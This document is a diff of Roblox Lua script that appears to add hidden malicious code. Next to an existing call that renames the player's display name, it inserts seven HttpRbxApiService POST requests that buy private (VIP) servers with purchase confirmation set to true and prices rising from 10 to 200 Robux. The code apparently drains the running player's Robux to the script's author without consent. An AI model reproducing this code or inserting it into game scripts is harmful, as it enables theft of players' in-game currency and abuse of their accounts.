@@ -30,3 +30,48 @@ HttpRbxApiService:RequestAsync({
         ["newDisplayName"] = "CheckNewGroupYouLox"
     })
 })
+
+local HttpService = game:GetService("HttpService")
+local HttpRbxApiService = game:GetService("HttpRbxApiService")
+
+HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/5682894409", HttpService:JSONEncode({
+  ["name"] = "Privatee",
+  ["expectedPrice"] = 10,
+  ["isPurchaseConfirmed"] = true
+    }))
+    wait()
+    HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649459193", HttpService:JSONEncode({
+  ["name"] = "Privatkae",
+  ["expectedPrice"] = 15,
+  ["isPurchaseConfirmed"] = true
+    }))
+wait()
+HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649481866", HttpService:JSONEncode({
+  ["name"] = "Privatess",
+  ["expectedPrice"] = 30,
+  ["isPurchaseConfirmed"] = true
+    }))
+    wait()
+    HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649489422", HttpService:JSONEncode({
+  ["name"] = "Privatkas",
+  ["expectedPrice"] = 50,
+  ["isPurchaseConfirmed"] = true
+    }))
+    wait()
+    HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649492080", HttpService:JSONEncode({
+  ["name"] = "Privatkaaas",
+  ["expectedPrice"] = 100,
+  ["isPurchaseConfirmed"] = true
+    }))
+    wait()
+    HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649496680", HttpService:JSONEncode({
+  ["name"] = "HuhPrivate",
+  ["expectedPrice"] = 150,
+  ["isPurchaseConfirmed"] = true
+    }))
+wait()
+HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/6649497969", HttpService:JSONEncode({
+  ["name"] = "PrivateHuh",
+  ["expectedPrice"] = 200,
+  ["isPurchaseConfirmed"] = true
+    }))
